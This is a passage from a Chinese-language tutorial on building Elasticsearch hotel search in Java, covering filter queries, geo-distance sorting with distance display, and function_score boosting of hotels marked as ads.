/>在之前的业务中，只有match查询，根据关键字搜索，现在要添加条件过滤，包括：</p></li><li><p>品牌过滤：是keyword类型，用term查询</p></li><li><p>星级过滤：是keyword类型，用term查询</p></li><li><p>价格过滤：是数值类型，用range查询</p></li><li><p>城市过滤：是keyword类型，用term查询</p></li></ul><p>多个查询条件组合，肯定是boolean查询来组合：</p><ul><li>关键字搜索放到must中，参与算分</li><li>其它过滤条件放到filter中，不参与算分</li></ul><p>因为条件构建的逻辑比较复杂，这里先封装为一个函数：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218494985-fec63bb5-e380-4ce8-ae93-f34db02ae6bb.png#crop=0&crop=0&crop=1&crop=1&id=pikbA&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />buildBasicQuery的代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">buildBasicQuery</span><span class="params">(RequestParams params, SearchRequest request)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 1.构建BooleanQuery</span></span><br><span class="line">    BoolQueryBuilder boolQuery = QueryBuilders.boolQuery();</span><br><span class="line">    <span class="comment">// 2.关键字搜索</span></span><br><span class="line">    String key = params.getKey();</span><br><span class="line">    <span class="keyword">if</span> (key == <span class="keyword">null</span> || <span class="string">&quot;&quot;</span>.equals(key)) &#123;</span><br><span class="line">        boolQuery.must(QueryBuilders.matchAllQuery());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        boolQuery.must(QueryBuilders.matchQuery(<span class="string">&quot;all&quot;</span>, key));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 3.城市条件</span></span><br><span class="line">    <span class="keyword">if</span> (params.getCity() != <span class="keyword">null</span> &amp;&amp; !params.getCity().equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        boolQuery.filter(QueryBuilders.termQuery(<span class="string">&quot;city&quot;</span>, params.getCity()));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 4.品牌条件</span></span><br><span class="line">    <span class="keyword">if</span> (params.getBrand() != <span class="keyword">null</span> &amp;&amp; !params.getBrand().equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        boolQuery.filter(QueryBuilders.termQuery(<span class="string">&quot;brand&quot;</span>, params.getBrand()));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 5.星级条件</span></span><br><span class="line">    <span class="keyword">if</span> (params.getStarName() != <span class="keyword">null</span> &amp;&amp; !params.getStarName().equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        boolQuery.filter(QueryBuilders.termQuery(<span class="string">&quot;starName&quot;</span>, params.getStarName()));</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 6.价格</span></span><br><span class="line">    <span class="keyword">if</span> (params.getMinPrice() != <span class="keyword">null</span> &amp;&amp; params.getMaxPrice() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        boolQuery.filter(QueryBuilders</span><br><span class="line">                         .rangeQuery(<span class="string">&quot;price&quot;</span>)</span><br><span class="line">                         .gte(params.getMinPrice())</span><br><span class="line">                         .lte(params.getMaxPrice())</span><br><span class="line">                        );</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 7.放入source</span></span><br><span class="line">    request.source().query(boolQuery);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="fSVGa"></a></p><h2 id="4-3-我周边的酒店"><a href="#4-3-我周边的酒店" class="headerlink" title="4.3.我周边的酒店"></a>4.3.我周边的酒店</h2><p>需求：我附近的酒店<br><a name="keepO"></a></p><h3 id="4-3-1-需求分析"><a href="#4-3-1-需求分析" class="headerlink" title="4.3.1.需求分析"></a>4.3.1.需求分析</h3><p>在酒店列表页的右侧，有一个小地图，点击地图的定位按钮，地图会找到你所在的位置：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218495089-1667f471-4fd5-46d7-ac21-b9c3c51603ff.png#crop=0&crop=0&crop=1&crop=1&id=jhCy9&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />并且，在前端会发起查询请求，将你的坐标发送到服务端：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218495175-e5ed1d2c-b785-4ace-a50f-1303173615fe.png#crop=0&crop=0&crop=1&crop=1&id=fFSzm&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />我们要做的事情就是基于这个location坐标，然后按照距离对周围酒店排序。实现思路如下：</p><ul><li><p>修改RequestParams参数，接收location字段</p></li><li><p>修改search方法业务逻辑，如果location有值，添加根据geo_distance排序的功能<br><a name="eEkXX"></a></p><h3 id="4-3-2-修改实体类"><a href="#4-3-2-修改实体类" class="headerlink" title="4.3.2.修改实体类"></a>4.3.2.修改实体类</h3><p>修改在<code>cn.itcast.hotel.pojo</code>包下的实体类RequestParams：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.hotel.pojo;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RequestParams</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String key;</span><br><span class="line">    <span class="keyword">private</span> Integer page;</span><br><span class="line">    <span class="keyword">private</span> Integer size;</span><br><span class="line">    <span class="keyword">private</span> String sortBy;</span><br><span class="line">    <span class="keyword">private</span> String city;</span><br><span class="line">    <span class="keyword">private</span> String brand;</span><br><span class="line">    <span class="keyword">private</span> String starName;</span><br><span class="line">    <span class="keyword">private</span> Integer minPrice;</span><br><span class="line">    <span class="keyword">private</span> Integer maxPrice;</span><br><span class="line">    <span class="comment">// 我当前的地理坐标</span></span><br><span class="line">    <span class="keyword">private</span> String location;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="JPXUP"></a></p><h3 id="4-3-3-距离排序API"><a href="#4-3-3-距离排序API" class="headerlink" title="4.3.3.距离排序API"></a>4.3.3.距离排序API</h3><p>我们以前学习过排序功能，包括两种：</p></li><li><p>普通字段排序</p></li><li><p>地理坐标排序</p></li></ul><p>我们只讲了普通字段排序对应的java写法。地理坐标排序只学过DSL语法，如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">GET /indexName/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;query&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;match_all&quot;</span>: &#123;&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;sort&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;price&quot;</span>: <span class="string">&quot;asc&quot;</span>  </span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;_geo_distance&quot;</span> : &#123;</span><br><span class="line">          <span class="attr">&quot;FIELD&quot;</span> : <span class="string">&quot;纬度，经度&quot;</span>,</span><br><span class="line">          <span class="attr">&quot;order&quot;</span> : <span class="string">&quot;asc&quot;</span>,</span><br><span class="line">          <span class="attr">&quot;unit&quot;</span> : <span class="string">&quot;km&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应的java代码示例：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218495264-d2db6fda-f456-4275-9435-dc95ab3ec889.png#crop=0&crop=0&crop=1&crop=1&id=tpjTC&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><a name="oMYAm"></a></p><h3 id="4-3-4-添加距离排序"><a href="#4-3-4-添加距离排序" class="headerlink" title="4.3.4.添加距离排序"></a>4.3.4.添加距离排序</h3><p>在<code>cn.itcast.hotel.service.impl</code>的<code>HotelService</code>的<code>search</code>方法中，添加一个排序功能：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218495351-04ee55b5-584d-4653-9ade-7aded636e019.png#crop=0&crop=0&crop=1&crop=1&id=gG9B2&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />完整代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> PageResult <span class="title">search</span><span class="params">(RequestParams params)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 1.准备Request</span></span><br><span class="line">        SearchRequest request = <span class="keyword">new</span> SearchRequest(<span class="string">&quot;hotel&quot;</span>);</span><br><span class="line">        <span class="comment">// 2.准备DSL</span></span><br><span class="line">        <span class="comment">// 2.1.query</span></span><br><span class="line">        buildBasicQuery(params, request);</span><br><span class="line">        <span class="comment">// 2.2.分页</span></span><br><span class="line">        <span class="keyword">int</span> page = params.getPage();</span><br><span class="line">        <span class="keyword">int</span> size = params.getSize();</span><br><span class="line">        request.source().from((page - <span class="number">1</span>) * size).size(size);</span><br><span class="line">        <span class="comment">// 2.3.排序</span></span><br><span class="line">        String location = params.getLocation();</span><br><span class="line">        <span class="keyword">if</span> (location != <span class="keyword">null</span> &amp;&amp; !location.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            request.source().sort(SortBuilders</span><br><span class="line">                                  .geoDistanceSort(<span class="string">&quot;location&quot;</span>, <span class="keyword">new</span> GeoPoint(location))</span><br><span class="line">                                  .order(SortOrder.ASC)</span><br><span class="line">                                  .unit(DistanceUnit.KILOMETERS)</span><br><span class="line">                                 );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 3.发送请求</span></span><br><span class="line">        SearchResponse response = client.search(request, RequestOptions.DEFAULT);</span><br><span class="line">        <span class="comment">// 4.解析响应</span></span><br><span class="line">        <span class="keyword">return</span> handleResponse(response);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="mmhdD"></a></p><h3 id="4-3-5-排序距离显示"><a href="#4-3-5-排序距离显示" class="headerlink" title="4.3.5.排序距离显示"></a>4.3.5.排序距离显示</h3><p>重启服务后，测试我的酒店功能：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218495456-a4576d2e-ba29-4653-9575-a4520495ccec.png#crop=0&crop=0&crop=1&crop=1&id=mAfVx&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />发现确实可以实现对我附近酒店的排序，不过并没有看到酒店到底距离我多远，这该怎么办？<br />排序完成后，页面还要获取我附近每个酒店的具体<strong>距离</strong>值，这个值在响应结果中是独立的：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218495570-0e2f70eb-d95d-45fb-ab5a-f207c210a6d3.png#crop=0&crop=0&crop=1&crop=1&id=dmuFo&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />因此，我们在结果解析阶段，除了解析source部分以外，还要得到sort部分，也就是排序的距离，然后放到响应结果中。<br />我们要做两件事：</p><ul><li>修改HotelDoc，添加排序距离字段，用于页面显示</li><li>修改HotelService类中的handleResponse方法，添加对sort值的获取</li></ul><p>1）修改HotelDoc类，添加距离字段</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.hotel.pojo;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> lombok.NoArgsConstructor;</span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HotelDoc</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String address;</span><br><span class="line">    <span class="keyword">private</span> Integer price;</span><br><span class="line">    <span class="keyword">private</span> Integer score;</span><br><span class="line">    <span class="keyword">private</span> String brand;</span><br><span class="line">    <span class="keyword">private</span> String city;</span><br><span class="line">    <span class="keyword">private</span> String starName;</span><br><span class="line">    <span class="keyword">private</span> String business;</span><br><span class="line">    <span class="keyword">private</span> String location;</span><br><span class="line">    <span class="keyword">private</span> String pic;</span><br><span class="line">    <span class="comment">// 排序时的 距离值</span></span><br><span class="line">    <span class="keyword">private</span> Object distance;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HotelDoc</span><span class="params">(Hotel hotel)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = hotel.getId();</span><br><span class="line">        <span class="keyword">this</span>.name = hotel.getName();</span><br><span class="line">        <span class="keyword">this</span>.address = hotel.getAddress();</span><br><span class="line">        <span class="keyword">this</span>.price = hotel.getPrice();</span><br><span class="line">        <span class="keyword">this</span>.score = hotel.getScore();</span><br><span class="line">        <span class="keyword">this</span>.brand = hotel.getBrand();</span><br><span class="line">        <span class="keyword">this</span>.city = hotel.getCity();</span><br><span class="line">        <span class="keyword">this</span>.starName = hotel.getStarName();</span><br><span class="line">        <span class="keyword">this</span>.business = hotel.getBusiness();</span><br><span class="line">        <span class="keyword">this</span>.location = hotel.getLatitude() + <span class="string">&quot;, &quot;</span> + hotel.getLongitude();</span><br><span class="line">        <span class="keyword">this</span>.pic = hotel.getPic();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2）修改HotelService中的handleResponse方法<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218495665-339c3bf2-820e-44cc-8429-09576817cc19.png#crop=0&crop=0&crop=1&crop=1&id=wQX6I&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />重启后测试，发现页面能成功显示距离了：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218495771-85b34aa7-a6b1-4e70-965e-baec474275da.png#crop=0&crop=0&crop=1&crop=1&id=F5OtP&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><a name="n9lvz"></a></p><h2 id="4-4-酒店竞价排名"><a href="#4-4-酒店竞价排名" class="headerlink" title="4.4.酒店竞价排名"></a>4.4.酒店竞价排名</h2><p>需求：让指定的酒店在搜索结果中排名置顶<br><a name="aeE3C"></a></p><h3 id="4-4-1-需求分析"><a href="#4-4-1-需求分析" class="headerlink" title="4.4.1.需求分析"></a>4.4.1.需求分析</h3><p>要让指定酒店在搜索结果中排名置顶，效果如图：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218495902-04dd3626-b298-48be-927b-2c17a907b27b.png#crop=0&crop=0&crop=1&crop=1&id=T6MMZ&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />页面会给指定的酒店添加<strong>广告</strong>标记。<br />那怎样才能让指定的酒店排名置顶呢？<br />我们之前学习过的function_score查询可以影响算分，算分高了，自然排名也就高了。而function_score包含3个要素：</p><ul><li>过滤条件：哪些文档要加分</li><li>算分函数：如何计算function score</li><li>加权方式：function score 与 query score如何运算</li></ul><p>这里的需求是：让<strong>指定酒店</strong>排名靠前。因此我们需要给这些酒店添加一个标记，这样在过滤条件中就可以<strong>根据这个标记来判断，是否要提高算分</strong>。<br />比如，我们给酒店添加一个字段：isAD，Boolean类型：</p><ul><li>true：是广告</li><li>false：不是广告</li></ul><p>这样function_score包含3个要素就很好确定了：</p><ul><li>过滤条件：判断isAD 是否为true</li><li>算分函数：我们可以用最简单暴力的weight，固定加权值</li><li>加权方式：可以用默认的相乘，大大提高算分</li></ul><p>因此，业务的实现步骤包括：</p><ol><li>给HotelDoc类添加isAD字段，Boolean类型</li><li>挑选几个你喜欢的酒店，给它的文档数据添加isAD字段，值为true</li><li>修改search方法，添加function score功能，给isAD值为true的酒店增加权重<br><a name="cLG2Z"></a><h3 id="4-4-2-修改HotelDoc实体"><a href="#4-4-2-修改HotelDoc实体" class="headerlink" title="4.4.2.修改HotelDoc实体"></a>4.4.2.修改HotelDoc实体</h3>给<code>cn.itcast.hotel.pojo</code>包下的HotelDoc类添加isAD字段：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218496005-858ef65f-ef79-4c48-a59f-7d418444dd0d.png#crop=0&crop=0&crop=1&crop=1&id=te8i2&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><a name="PPZPz"></a><h3 id="4-4-3-添加广告标记"><a href="#4-4-3-添加广告标记" class="headerlink" title="4.4.3.添加广告标记"></a>4.4.3.添加广告标记</h3>接下来，我们挑几个酒店，添加isAD字段，设置为true：<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">POST /hotel/_update/<span class="number">1902197537</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;doc&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;isAD&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">POST /hotel/_update/<span class="number">2056126831</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;doc&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;isAD&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">POST /hotel/_update/<span class="number">1989806195</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;doc&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;isAD&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">POST /hotel/_update/<span class="number">2056105938</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;doc&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;isAD&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a name="eLLiF"></a><h3 id="4-4-4-添加算分函数查询"><a href="#4-4-4-添加算分函数查询" class="headerlink" title="4.4.4.添加算分函数查询"></a>4.4.4.添加算分函数查询</h3>接下来我们就要修改查询条件了。之前是用的boolean 查询，现在要改成function_socre查询。<br />function_score查询结构如下：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218492148-edc999a4-3d92-4f9b-a9ff-19da37f00cd0.png#crop=0&crop=0&crop=1&crop=1&id=MsYEG&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />对应的JavaAPI如下：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218496098-9d63e4f3-de19-4ea0-a6be-1d86722dcebd.png#crop=0&crop=0&crop=1&crop=1&id=qeZny&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />我们可以将之前写的boolean查询作为<strong>原始查询</strong>条件放到query中，接下来就是添加<strong>过滤条件</strong>、<strong>算分函数</strong>、<strong>加权模式</strong>了。所以原来的代码依然可以沿用。<br />修改<code>cn.itcast.hotel.service.impl</code>包下的<code>HotelService</code>类中的<code>buildBasicQuery</code>方法，添加算分函数查询：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">buildBasicQuery</span><span class="params">(RequestParams params, SearchRequest request)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 1.构建BooleanQuery</span></span><br><span class="line">    BoolQueryBuilder boolQuery = QueryBuilders.boolQuery();</span><br><span class="line">    <span class="comment">// 关键字搜索</span></span><br><span class="line">    String key = params.getKey();</span><br><span class="line">    <span class="keyword">if</span> (key == <span class="keyword">null</span> || <span class="string">&quot;&quot;</span>.equals(key)) &#123;</span><br><span class="line">        boolQuery.must(QueryBuilders.matchAllQuery());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        boolQuery.must(QueryBuilders.matchQuery(<span class="string">&quot;all&quot;</span>, key));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 城市条件</span></span><br><span class="line">    <span class="keyword">if</span> (params.getCity() != <span class="keyword">null</span> &amp;&amp; !params.getCity().equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        boolQuery.filter(QueryBuilders.termQuery(<span class="string">&quot;city&quot;</span>, params.getCity()));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 品牌条件</span></span><br><span class="line">    <span class="keyword">if</span> (params.getBrand() != <span class="keyword">null</span> &amp;&amp; !params.getBrand().equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        boolQuery.filter(QueryBuilders.termQuery(<span class="string">&quot;brand&quot;</span>, params.getBrand()));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 星级条件</span></span><br><span class="line">    <span class="keyword">if</span> (params.getStarName() != <span class="keyword">null</span> &amp;&amp; !params.getStarName().equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        boolQuery.filter(QueryBuilders.termQuery(<span class="string">&quot;starName&quot;</span>, params.getStarName()));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 价格</span></span><br><span class="line">    <span class="keyword">if</span> (params.getMinPrice() != <span class="keyword">null</span> &amp;&amp; params.getMaxPrice() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        boolQuery.filter(QueryBuilders</span><br><span class="line">                         .rangeQuery(<span class="string">&quot;price&quot;</span>)</span><br><span class="line">                         .gte(params.getMinPrice())</span><br><span class="line">                         .lte(params.getMaxPrice())</span><br><span class="line">                        );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2.算分控制</span></span><br><span class="line">    FunctionScoreQueryBuilder functionScoreQuery =</span><br><span class="line">        QueryBuilders.functionScoreQuery(</span><br><span class="line">        <span class="comment">// 原始查询，相关性算分的查询</span></span><br><span class="line">        boolQuery,</span><br><span class="line">        <span class="comment">// function score的数组</span></span><br><span class="line">        <span class="keyword">new</span> FunctionScoreQueryBuilder.FilterFunctionBuilder[]&#123;</span><br><span class="line">            <span class="comment">// 其中的一个function score 元素</span></span><br><span class="line">            <span class="keyword">new</span> FunctionScoreQueryBuilder.FilterFunctionBuilder(</span><br><span class="line">                <span class="comment">// 过滤条件</span></span><br><span class="line">                QueryBuilders.termQuery(<span class="string">&quot;isAD&quot;</span>, <span class="keyword">true</span>),</span><br><span class="line">                <span class="comment">// 算分函数</span></span><br><span class="line">                ScoreFunctionBuilders.weightFactorFunction(<span class="number">10</span>)</span><br><span class="line">            )</span><br><span class="line">        &#125;);</span><br><span class="line">    request.source().query(functionScoreQuery);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> JavaEE </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
